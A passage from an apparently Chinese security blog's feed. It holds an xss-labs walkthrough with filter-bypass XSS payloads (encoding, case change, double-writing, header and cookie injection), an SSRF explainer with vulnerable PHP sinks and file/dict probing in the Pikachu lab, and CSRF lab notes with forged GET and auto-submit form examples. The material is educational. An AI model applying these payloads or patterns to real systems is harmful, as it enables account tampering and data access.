class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(&#x27;123&#x27;)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015152332.png" alt="image.png"></li></ul><h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015152447.png" alt="image.png"></p><ul><li>看起来和level2差不多</li><li>输入一样的内容发现不行<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015152535.png" alt="image.png"></li><li>查看html代码，发现这次value的值是用单引号的</li><li>把前面改成单引号试试<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015152828.png" alt="image.png"></li><li>发现还是不行，输入的<code>&lt;</code>、<code>&gt;</code>都被编码成了html字符，这里是使用了<code>htmlspecialchars()</code>函数</li><li>所以我们可以尝试其他不用这些符号的语句<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=<span class="string">&#x27; onfocus=javscript:alert(&#x27;</span><span class="number">123</span><span class="string">&#x27;)%20</span></span><br></pre></td></tr></table></figure></li><li>onfocus的作用是当点击输入框的时候会触发指令</li><li><code>&#39;</code>的作用是闭合value的值</li><li><code>%20</code>是url编码的空格，用于与后面语句隔开<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015153542.png" alt="image.png"></li></ul><h1 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h1><ul><li>看起来又和前面一样，尝试再来一次<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015153735.png" alt="image.png"></li><li>发现和前面不一样的是，这次是双引号</li><li>把单引号改成双引号就行<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015153854.png" alt="image.png"></li></ul><h1 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h1><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015153947.png" alt="image.png"></p><ul><li>用相同的方法发现不行，onfocus中间被奇怪的符号隔开了，用<code>&lt;script&gt;</code>也是这样</li><li>应该是这几个关键词被过滤了，那就有其他的关键词</li><li><code>&lt;a&gt;</code>是超链接，应该可以用<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015154845.png" alt="image.png"></li></ul><h1 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h1><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015155015.png" alt="image.png"></p><ul><li>用相同的方法，发现href也被过滤了</li><li>那尝试一下大小写吧<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015155110.png" alt="image.png"></li><li>立马就成功了</li></ul><h1 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h1><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015155201.png" alt="image.png"></p><ul><li>相同的方法，发现中间的很多字符消失了</li><li>猜测是被识别过滤了</li><li>尝试双写绕过<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015155334.png" alt="image.png"></li></ul><h1 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h1><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015155404.png" alt="image.png"></p><ul><li>这题和之前看起来有一点点不一样，有个友情链接的超链接，点了发现是404<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015155446.png" alt="image.png"></li><li>用查看器一看，发现超链接的目标就是输入框的内容</li><li>那么就在输入框当中输入语句<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015155735.png" alt="image.png"></li><li>发现script还是被过滤了，前面用过的都被过滤了</li><li>所以尝试用编码绕过</li><li>这里使用Unicode编码，使用<a href="https://c.runoob.com/front-end/3602/">Unicode在线转换工具</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015160536.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015160617.png" alt="image.png"></li><li>通过unicode编码绕过了过滤机制</li></ul><h1 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h1><ul><li>看起来和上一题一样，输入语句，发现不合法<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015160732.png" alt="image.png"></li><li>这里一直没搞明白，就去看看源代码<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015160856.png" alt="image.png"></li><li>在源代码中，看见有一个过滤机制，<a href="https://www.runoob.com/php/func-string-strpos.html">strpos()用法</a></li><li>用于检测是否包含指定字符，这里是检测是否包含<code>http://</code></li><li>我们只需要在背后加上<code>http://</code>，并且用<code>//</code>放前面注释掉它就行<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#<span class="number">106</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">118</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">115</span>;&amp;#<span class="number">99</span>;&amp;#<span class="number">114</span>;&amp;#<span class="number">105</span>;&amp;#<span class="number">112</span>;&amp;#<span class="number">116</span>;&amp;#<span class="number">58</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">108</span>;&amp;#<span class="number">101</span>;&amp;#<span class="number">114</span>;&amp;#<span class="number">116</span>;&amp;#<span class="number">40</span>;&amp;#<span class="number">39</span>;&amp;#<span class="number">49</span>;&amp;#<span class="number">39</span>;&amp;#<span class="number">41</span>;<span class="comment">//http://</span></span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015161444.png" alt="image.png"></li></ul><h1 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h1><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015161616.png" alt="image.png"></p><ul><li>这一关和前面的都不一样，没有输入框也没有按钮</li><li>用查看器看，发现多了几个参数<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015161607.png" alt="image.png"></li><li>尝试一下能不能通过get传递到服务器<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xss-labs/level10.php?keyword=well done!&amp;t_link=1&amp;t_history=2&amp;t_sort=3</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015161806.png" alt="image.png"></li><li>发现<code>t_sort</code>的参数发生了变化，变成我们设定的数字</li><li>我们就可以在这里插入我们的语句<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015161958.png" alt="image.png"></li><li>发现尖括号又被过滤了，那么只能使用能在尖括号当中的语句了</li><li>如果是用上面用过的onfocus的话，没有输入框，难以触发</li><li>所以我们应该需要将内容显现出来，然后添加触发按钮<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_sort=<span class="string">&quot; type=&quot;</span>text<span class="string">&quot; onclick=&quot;</span><span class="title function_">alert</span>(<span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015162428.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015162437.png" alt="image.png"></li></ul><h1 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h1><ul><li>和上题一样，通过查看器发现多了一个参数<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015162605.png" alt="image.png"></li><li><code>ref</code>猜测是referer，再看后面的值，基本确定就是referer</li><li>所以我们在传递referer当中插入我们的代码就行<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; type=&quot;text&quot; onclick=&quot;alert(&#x27;1&#x27;)</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015162829.png" alt="image.png"></li></ul><h1 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h1><ul><li>同样发现有一个特殊的参数<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015162922.png" alt="image.png"></li><li>通过t_ua这个名字，以及后面的参数，猜测应该是user agent<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015163038.png" alt="image.png"></li></ul><h1 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h1><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015163105.png" alt="image.png"></p><ul><li>cook猜测是cookie信息<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=&quot; type=&quot;text&quot; onclick=&quot;alert(&#x27;1&#x27;)</span><br></pre></td></tr></table></figure></li><li>前面需要加<code>user=</code>，表示cookie信息当中的用户<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015163321.png" alt="image.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> XSS </tag>
            
            <tag> xss-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF服务端请求伪造攻击</title>
      <link href="/2023/10/13/SSRF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/"/>
      <url>/2023/10/13/SSRF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF-简介"><a href="#SSRF-简介" class="headerlink" title="SSRF 简介"></a>SSRF 简介</h1><ul><li>SSRF（Server-Side Request Forgery，服务端请求伪造），是攻击者让服务端发起构造的指定请求链接造成的漏洞。  </li><li>由于存在防火墙的防护，导致攻击者无法直接入侵内网；这时攻击者可以以服务器为跳板发起一些网络请求，从而攻击内网的应用及获取内网数据。</li></ul><h1 id="SSRF与CSRF的区别"><a href="#SSRF与CSRF的区别" class="headerlink" title="SSRF与CSRF的区别"></a>SSRF与CSRF的区别</h1><ul><li>CSRF是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以利用用户的cookie信息伪造用户请求发送至服务器；</li><li>SSRF是服务器对用户提供的可控URL过于信任，没有对攻击者提供的URL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或者其它服务器。</li></ul><h1 id="SSRF-原理"><a href="#SSRF-原理" class="headerlink" title="SSRF 原理"></a>SSRF 原理</h1><ul><li>SSRF形成的原因大都是由于服务端提供了从其他服务器或应用中获取数据的功能，但没有对目标地址做出有效的过滤与限制造成的。</li><li>比如，一个正常的Web应用，本应该从指定URL获取网页文本内容或加载指定地址的图片，而攻击者利用漏洞伪造服务器端发出请求，从而突破了客户端获取不到数据的限制，如内网资源、服务器本地资源等。</li></ul><h1 id="SSRF-漏洞利用手段"><a href="#SSRF-漏洞利用手段" class="headerlink" title="SSRF 漏洞利用手段"></a>SSRF 漏洞利用手段</h1><ul><li>对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。</li><li>攻击运行在内网或本地的应用程序。</li><li>对内网Web应用进行指纹识别，识别企业内部的资产信息。</li><li>攻击内外网的Web应用，主要是使用HTTP GET请求就可以实现的攻击(比如struts2、SQli等)。</li><li>利用file协议读取本地文件等。</li><li>漏洞产生相关函数：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_contents</span>()、<span class="title function_ invoke__">fsockopen</span>()、<span class="title function_ invoke__">curl_exec</span>()、<span class="title function_ invoke__">fopen</span>()、<span class="title function_ invoke__">readfile</span>()</span><br></pre></td></tr></table></figure></li></ul><h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h2><ul><li><code>file_get_content</code>函数从用户指定的url获取内容，然后指定一个文件名进行保存，并展示给用户。<code>file_put_content</code>函数把一个字符串写入文件中。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h2><ul><li><code>fsockopen</code>函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>) </span>&#123; </span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);   </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line">        <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123; </span><br><span class="line">            <span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h2><ul><li><code>curl_exec</code>函数用于执行指定的curl会话<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();<span class="comment">// 创建新的 cURL 资源</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);<span class="comment">// 设置 URL 和相应的选项</span></span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);<span class="comment">// 抓取 URL 并把它传递给浏览器</span></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);<span class="comment">// 关闭 cURL 资源，并且释放系统资源</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><strong>注意：</strong></li></ul><ol><li>一般情况下PHP不会开启fopen的gopher wrapper</li><li>file_get_contents的gopher协议不能URL编码</li><li>file_get_contents关于Gopher的302跳转会出现bug，导致利用失败</li><li>curl&#x2F;libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用</li><li>curl_exec() 默认不跟踪跳转，</li><li>file_get_contents() 支持php:&#x2F;&#x2F;input协议</li></ol><h1 id="Pikachu-SSRF实验练习"><a href="#Pikachu-SSRF实验练习" class="headerlink" title="Pikachu-SSRF实验练习"></a>Pikachu-SSRF实验练习</h1><h2 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h2><ul><li>可以先看看<a href="https://www.runoob.com/php/php-ref-curl.html">curl的用法</a>，因为我也不是很懂这个curl</li><li>PHP支持的由Daniel Stenberg创建的libcurl库允许你与各种的服务器使用各种类型的协议进行连接和通讯。</li><li>libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP基于表单的上传、代理、cookies和用户名+密码的认证。</li><li>进入到页面，可以看到一个链接，我们点击它<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013220530.png" alt="image.png"></li><li>应该会出现“假如生活欺骗了你”的内容，但是我这里文件丢失了，<strong>请无视</strong>，不影响后续操作</li><li>我们可以看到url地址<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013220549.png" alt="image.png"></li><li>因为curl支持多种协议，我们尝试一下</li></ul><h3 id="通过网站访问链接"><a href="#通过网站访问链接" class="headerlink" title="通过网站访问链接"></a>通过网站访问链接</h3><ul><li>我们直接把后面的url改成百度的网址，很鬼畜，居然重合了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013220838.png" alt="image.png"></li></ul><h3 id="利用file协议查看本地文件"><a href="#利用file协议查看本地文件" class="headerlink" title="利用file协议查看本地文件"></a>利用file协议查看本地文件</h3><ul><li>直接把url修改成本地文件的地址，就可以查看文件内容<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013221050.png" alt="image.png"></li></ul><h3 id="dict协议扫描内网主机开放端口"><a href="#dict协议扫描内网主机开放端口" class="headerlink" title="dict协议扫描内网主机开放端口"></a>dict协议扫描内网主机开放端口</h3><ul><li>连接上开放的端口，我这里是链接了MySQL数据库<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013222152.png" alt="image.png"></li></ul><h2 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h2><ul><li>同样可以先了解了解<a href="https://www.runoob.com/php/func-filesystem-file-get-contents.html">file_get_content()的用法</a></li><li>和上一题差不多，不过url换成了file<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013222415.png" alt="image.png"></li></ul><h3 id="file读取本地文件"><a href="#file读取本地文件" class="headerlink" title="file读取本地文件"></a>file读取本地文件</h3><ul><li>输入本地文件地址，可以查看本地文件内容<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013223622.png" alt="image.png"></li></ul><h3 id="http协议请求内网资源"><a href="#http协议请求内网资源" class="headerlink" title="http协议请求内网资源"></a>http协议请求内网资源</h3><ul><li>也可以通过http访问内网的资源<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013224657.png" alt="image.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pikachu-CSRF跨站请求伪造练习</title>
      <link href="/2023/10/13/Pikachu-CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E7%BB%83%E4%B9%A0/"/>
      <url>/2023/10/13/Pikachu-CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="第一关-CSRF-get"><a href="#第一关-CSRF-get" class="headerlink" title="第一关 CSRF(get)"></a>第一关 CSRF(get)</h1><ul><li><p>看标题知道这是个get请求的csrf</p></li><li><p>我们点击提示可以看到受信任的用户名和密码<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013192453.png" alt="image.png"></p></li><li><p>登录其中一个<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013192510.png" alt="image.png"></p></li><li><p>我们现在模拟allen修改信息</p></li><li><p>点击修改个人信息</p></li><li><p>随便修改一项，我这里修改了邮箱</p></li><li><p>同时进行抓包<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013192645.png" alt="image.png"></p></li><li><p>确定是get请求</p></li><li><p>我们可以对这条get请求做手脚</p></li><li><p>比如把性别改成女的（666纯纯恶搞）<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013192815.png" alt="image.png"></p></li><li><p>这个操作在真实案例当中应该是由链接触发的，这只是模拟</p></li></ul><h1 id="第二关-CSRF-post"><a href="#第二关-CSRF-post" class="headerlink" title="第二关 CSRF(post)"></a>第二关 CSRF(post)</h1><ul><li>看题目知道是post类型的</li><li>通过提示登录进去<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013193323.png" alt="image.png"></li><li>与上面的方法一样，也是模拟用户修改信息，然后抓包修改</li><li>抓到了post包，模拟链接修改这段<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013193439.png" alt="image.png"></li><li>再次将这个人改成女的<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013193604.png" alt="image.png"></li></ul><h1 id="第三关-CSRF-Token"><a href="#第三关-CSRF-Token" class="headerlink" title="第三关 CSRF Token"></a>第三关 CSRF Token</h1><ul><li>与上面的两个一样，还是先登录受信任的用户</li><li>然后修改信息，我这里还是修改邮箱<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013202216.png" alt="image.png"></li><li>这里可以看见，在get包当中有token值，是令牌用于鉴别身份的</li><li>我们需要盗取token</li><li>我们将这个get包放入重发器当中，我们发现token发生了变化，所以我们需要使用新的token，原来那个会失效<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013202321.png" alt="image.png"></li><li>我们将新的token复制到get包当中替换，然后修改信息，我这里还是改了boy</li><li>可以看见成功了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013202451.png" alt="image.png"></li><li>回到页面可以看见改成boy了，说明修改成功<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013202617.png" alt="image.png"></li><li>希望以上的三个练习可以帮助你更好的学习CSRF攻击</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> csrf </tag>
            
            <tag> pikachu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF跨站域请求伪造攻击</title>
      <link href="/2023/10/13/CSRF%E8%B7%A8%E7%AB%99%E5%9F%9F%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/"/>
      <url>/2023/10/13/CSRF%E8%B7%A8%E7%AB%99%E5%9F%9F%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF简介"><a href="#CSRF简介" class="headerlink" title="CSRF简介"></a>CSRF简介</h1><ul><li>CSRF（Cross Site Request Forgery，跨站域请求伪造），也被称为 “One Click Attack” 或者 Session Riding，通常缩写为 CSRF 或者 XSRF 。</li><li>尽管听起来像跨站脚本（XSS），但它与XSS非常不同，并且攻击方式几乎相左。XSS 利用站点内的信任用户，而 CSRF 则通过伪装成来自受信任用户的请求来利用受信任的网站。</li></ul><h1 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title="CSRF原理"></a>CSRF原理</h1><ul><li>首先是存在CSRF漏洞的网站A，以及存在恶意攻击代码的网站B，还有受网站A信任的用户C</li></ul><ol><li>用户C通过浏览器正常访问网站A，</li><li>通过验证在浏览器生成cookie信息</li><li>用户C在没有登出网站A的情况下，访问网站B</li><li>网站B返回给用户一些攻击性代码，并请求访问网站A</li><li>这样网站B就在用户不知情的情况下，利用浏览器保存的cookie信息对网站A进行访问请求，导致网站B的恶意代码能够在网站A被信任执行</li></ol><ul><li>需要满足两个条件：</li></ul><ol><li>登录受信任网站A，并生成cookie</li><li>不登出网站A的情况下，访问网站B</li></ol><h1 id="CSRF危害"><a href="#CSRF危害" class="headerlink" title="CSRF危害"></a>CSRF危害</h1><ul><li>你不能保证你登录了一个网站后，不再打开一个 tab 页面并访问另外的网站。</li><li>你不能保证你关闭浏览器了后，你本地的 Cookie 立刻过期，你上次的会话已经结束。（事实上，关闭浏览器不能结束一个会话，但大多数人都会错误的认为关闭浏览器就等于退出登录&#x2F;结束会话了…）</li><li>上面所谓的攻击网站，可能是一个存在其他漏洞的可信任的经常被人访问的网站。</li><li>攻击者盗用用户身份进行恶意行为，包括以他人名义发送邮件，盗取账户，购买商品等等</li><li>更重要的是个人隐私的泄露以及财产安全</li></ul><h1 id="CSRF攻击类型"><a href="#CSRF攻击类型" class="headerlink" title="CSRF攻击类型"></a>CSRF攻击类型</h1><h2 id="GET型"><a href="#GET型" class="headerlink" title="GET型"></a>GET型</h2><ul><li>通过GET请求进行修改</li><li>比如用户修改邮箱是通过GET请求修改的，例如<code>/user.php?id=1&amp;email=123@163.com</code></li><li>意思是用户id为1的用户需要修改邮箱为<code>123@163.com</code></li><li>那么恶意网站当中有一段代码内容，例如<code>&lt;img src=/user.php?id=1&amp;email=abc@163.com&gt;</code></li><li>那么，只需要用户在打开修改邮箱的同时打开了这个恶意网站，那么浏览器就会带上用户的cookie信息向修改邮箱的网站发出GET请求，导致该用户的邮箱被修改成了<code>abc@163.com</code></li></ul><h2 id="POST型"><a href="#POST型" class="headerlink" title="POST型"></a>POST型</h2><ul><li>POST型相较于GET型来说，危害没那么大，通常是使用一个自动提交表单</li><li>例如在购买商品时，网站会处理购买时用户余额的扣除，会在一个地址内进行，如<code>/coures/user/handler/25332/buy.php</code></li><li>通过提交表单在buy.php当中处理扣除信息<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">/coures/user/handler/25332/buy</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;xx&quot;</span> <span class="attr">value</span>=<span class="string">&quot;xx&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>(); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure></li><li>访问该页面，表单会自动提交，相当于模拟用户提交一次POST</li></ul><h1 id="CSRF防御"><a href="#CSRF防御" class="headerlink" 